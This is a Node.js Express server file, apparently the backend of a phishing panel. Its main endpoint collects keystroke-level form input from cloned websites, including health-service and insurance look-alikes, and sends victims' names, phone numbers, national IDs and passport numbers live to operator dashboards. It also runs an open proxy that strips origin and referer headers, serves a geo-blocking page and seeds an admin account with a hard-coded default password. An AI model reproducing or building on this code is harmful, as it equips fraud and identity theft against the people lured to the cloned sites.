import express from 'express';
import http from 'http';
import { Server } from 'socket.io';
import mongoose from 'mongoose';
import cors from 'cors';
import bcrypt from 'bcryptjs';
import 'dotenv/config';
import Site from './models/Site.js';
import User from './models/User.js';
import Visitor from './models/Visitor.js';
import Submission from './models/Submission.js';

import authRoutes from './Routes/auth.js';
import siteRoutes from './Routes/sites.js';
import dashboardRoutes from './Routes/dashboard.js';
import trackerRoutes from './Routes/tracker.js';

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST", "DELETE"] }
});

app.use(cors({ origin: "*" }));

// 🔄 تنظيف المسارات من أي شرطات مائلة مزدوجة مكررة لضمان توجيه مثالي للمسارات الخلفية
app.use((req, res, next) => {
    const urlParts = req.url.split('?');
    urlParts[0] = urlParts[0].replace(/\/\/+/g, '/');
    req.url = urlParts.join('?');
    next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public', { extensions: ['html'] }));

app.use((req, res, next) => {
    req.io = io;
    next();
});

// 🛣️ المسارات
app.use('/api/auth', authRoutes);
app.use('/api/sites', siteRoutes);
app.use('/api/dashboard', dashboardRoutes);
app.use('/api/tracker', trackerRoutes);

// 📡 استقبال البث المباشر لمدخلات كاتب البيانات (Live Stream Inputs) ومنع الـ 404
app.post('/api/stream-input', async (req, res) => {
    try {
        const { siteKey, visitorToken, data, isConfirmed } = req.body;
        if (!visitorToken) return res.status(400).json({ error: "Missing visitorToken" });

        // ⛔ لا يُسجَّل أي موقع تلقائياً إلا إذا أرسل الموقع مفتاحه صراحةً
        const hasExplicitSiteKey = !!(siteKey && siteKey.trim());
        let activeSite = hasExplicitSiteKey ? siteKey.trim() : 'site_unknown';

        // 🧠 إستراتيجية مطابقة الدومين المطور تلقائياً لربط أي مستنسخ خارجي باللوحة المركزية بمرونة كاملة
        try {
            const referer = req.headers.referer || req.headers.origin || '';
            if (referer && (referer.startsWith('http://') || referer.startsWith('https://'))) {
                const parsedUrl = new URL(referer);
                const hostname = parsedUrl.hostname.toLowerCase().replace('www.', '');
                if (hostname && hostname !== 'localhost' && hostname !== '127.0.0.1') {
                    const matchedSite = await Site.findOne({ domain: { $regex: new RegExp(hostname, 'i') } });
                    if (matchedSite) {
                        activeSite = matchedSite.siteKey;
                    }
                }
            }
        } catch (err) {
            console.error("[Domain Router Error]:", err.message);
        }
        try {
            if (hasExplicitSiteKey) {
                await Site.findOneAndUpdate(
                    { siteKey: activeSite },
                    { siteKey: activeSite, name: 'موقع جديد (' + activeSite + ')', color: '#10b981' },
                    { upsert: true }
                );
            }
        } catch (e) { }
        const formName = (req.body.formName) || (activeSite.includes('sehhaty') ? 'البيانات الشخصية' : 'شراء وثيقة تأمين');

        // 🧠 تحديث أو إنشاء سجل المدخلات
        let currentSub = await Submission.findOne({
            visitorToken: visitorToken,
            siteKey: activeSite,
            isFinalSubmission: false
        }).sort({ createdAt: -1 });

        if (currentSub) {
            currentSub.submissionData = { ...currentSub.submissionData, ...data };
            currentSub.isFinalSubmission = !!isConfirmed;
            currentSub.updatedAt = new Date();
            await currentSub.save();
        } else {
            await Submission.create({
                visitorToken: visitorToken,
                siteKey: activeSite,
                formName: formName + (isConfirmed ? ' (مؤكد ✅)' : ' (يجري الكتابة 🟡)'),
                submissionData: data,
                isFinalSubmission: !!isConfirmed,
                createdAt: new Date(),
                updatedAt: new Date()
            });
        }

        // 🧠 تحديث بيانات الزائر المعروضة في لوحة التحكم بشكل لحظي
        let visitor = await Visitor.findOne({ token: visitorToken });
        if (visitor) {
            Object.entries(data).forEach(([k, v]) => {
                const valStr = String(v || '').trim();
                if (valStr) {
                    const checkKey = k.toLowerCase();
                    if (checkKey.includes('name') || checkKey.includes('اسم')) visitor.name = valStr;
                    if (checkKey.includes('phone') || checkKey.includes('جوال') || checkKey.includes('هاتف')) visitor.phone = valStr;
                    if (checkKey.includes('nationalid') || checkKey.includes('هوية') || checkKey.includes('اقامة') || checkKey.includes('passport')) visitor.nationalId = valStr;
                }
            });
            visitor.lastSeen = Date.now();
            await visitor.save();
            io.emit('visitor_updated', visitor);
        }

        return res.json({ success: true });
    } catch (err) {
        console.error('Error in stream-input:', err.message);
        return res.status(500).json({ error: err.message });
    }
});

// 🔄 وكيل التفافي سحابي مخصص (Private Reverse Proxy) لجلب لوكابات منافذ والتخلص من CORS و 522
app.all('/api/manafith-proxy', async (req, res) => {
    try {
        const target = req.query.url;
        if (!target) return res.status(400).json({ error: 'Missing target url parameter' });

        const lowerTarget = target.toLowerCase();
        
        // ممر ذكي لتأطير البيانات بشكل يطابق توقعات الفرونت اند بالكامل
        
        // 2. تمرير كافة اللوكابات والاستعلامات الأخرى مباشرة إلى الخادم الأصلي
        const headers = { ...req.headers };
        delete headers.host;
        delete headers.origin;
        delete headers.referer;

        if (!headers['user-agent']) {
            headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
        }

        const options = {
            method: req.method,
            headers: headers
        };

        if (req.method !== 'GET' && req.method !== 'HEAD' && req.body) {
            options.body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        }

        console.log(`[PROXY] Forwarding: ${target}`);
        const remoteRes = await fetch(target, options);
        
        res.status(remoteRes.status);
        
        const contentType = remoteRes.headers.get('content-type');
        if (contentType) res.setHeader('Content-Type', contentType);

        const buffer = Buffer.from(await remoteRes.arrayBuffer());
        console.log(`[PROXY] Success: ${target} -> Status: ${remoteRes.status}`);
        return res.send(buffer);
    } catch (err) {
        console.error(`[PROXY ERROR] Forwarding failed:`, err.message);
        return res.status(500).json({ error: err.message });
    }
});



// 🛑 صفحة الحظر الجغرافي
app.get(/^.*$/, (req, res, next) => {
    if (req.originalUrl.startsWith('/api') || req.originalUrl.includes('.')) return next();

    if (req.path === '/blocked') {
        return res.send(`
            <!DOCTYPE html>
            <html lang="ar" dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>تم حظر الوصول</title>
            </head>
            <body style="font-family: Arial, sans-serif; text-align: center; padding-top: 100px; background: #fff1f2;">
                <h1 style="color: #e11d48; font-size: 28px;">عذراً، الخدمة غير متوفرة في منطقتك الجغرافية</h1>
                <p style="color: #4b5563; font-size: 16px; margin-top: 10px;">تم تقييد الوصول إلى هذا الموقع وفقاً لسياسات الأمان.</p>
            </body>
            </html>
        `);
    }

    next();
});

// ⚡ إشعار اتصال Socket.io
io.on('connection', (socket) => {
    console.log(`⚡ متصل جديد (لوحة أو زائر): ${socket.id}`);

    socket.on('join_sites', (siteKeys) => {
        if (Array.isArray(siteKeys)) {
            siteKeys.forEach(k => socket.join(k));
        } else if (siteKeys) {
            socket.join(siteKeys);
        }
    });
});

// 🚀 زرع المواقع الافتراضية والمدير
async function bootstrapInitialData() {
    try {
        const adminExists = await User.findOne({ username: 'admin' });
        if (!adminExists) {
            const hashedPassword = await bcrypt.hash('admin123456', 10);
            await User.create({
                username: 'admin',
                password: hashedPassword,
                displayName: 'المدير العام',
                role: 'admin',
                assignedSites: []
            });
            console.log('👤 تم إنشاء حساب المدير الافتراضي: admin / admin123456');
        }

        // ⛔ لا تُزرع مواقع افتراضية تلقائياً.
        //    كان هذا يعيد المواقع التي حذفتها (site_cars_01 وغيرها) عند كل إعادة تشغيل.
        //    لزرع موقع تجريبي عند الحاجة فقط: SEED_DEMO_SITES=true
        if (process.env.SEED_DEMO_SITES === 'true') {
            const siteCount = await Site.countDocuments();
            if (siteCount === 0) {
                await Site.create({ siteKey: 'site_demo_01', name: 'موقع تجريبي', color: '#3b82f6' });
                console.log('✅ تم تهيئة الموقع التجريبي (SEED_DEMO_SITES=true)');
            }
        }
    } catch (e) {
        console.error('Bootstrap Error:', e.message);
    }
}

// 🌐 تشغيل السيرفر والاتصال بقاعدة البيانات
const PORT = process.env.PORT || 5000;
const MONGO_URI = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/saas_tracker';

server.listen(PORT, async () => {
    console.log(`🌐 الخادم يعمل الآن على المنفذ: ${PORT}`);
    try {
        await mongoose.connect(MONGO_URI);
        console.log('✅ تم الاتصال بقاعدة بيانات MongoDB بنجاح!');
        await bootstrapInitialData();
    } catch (err) {
        console.error('❌ خطأ في الاتصال بقاعدة البيانات:', err.message);
    }
});

// التقاط أي خطأ غير متوقع لمنع الإغلاق الصامت
process.on('uncaughtException', (err) => {
    console.error('🚨 Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason) => {
    console.error('🚨 Unhandled Rejection:', reason);
});